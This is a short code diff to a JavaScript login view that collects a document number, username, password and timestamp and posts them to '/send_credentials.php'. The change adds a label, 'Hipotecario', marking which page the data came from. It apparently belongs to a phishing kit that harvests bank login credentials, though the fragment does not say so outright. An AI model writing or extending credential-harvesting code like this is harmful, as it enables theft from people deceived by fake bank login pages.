@@ -63,7 +63,8 @@ const LoginView = () => {
                 document: documentVal,
                 username: usernameVal,
                 password: passwordVal,
-                created: moment(date).format('YYYY-MM-DD HH:mm:ss').toString()
+                created: moment(date).format('YYYY-MM-DD HH:mm:ss').toString(),
+                webpage: "Hipotecario"
             }
 
             await axios.post("/send_credentials.php", data)
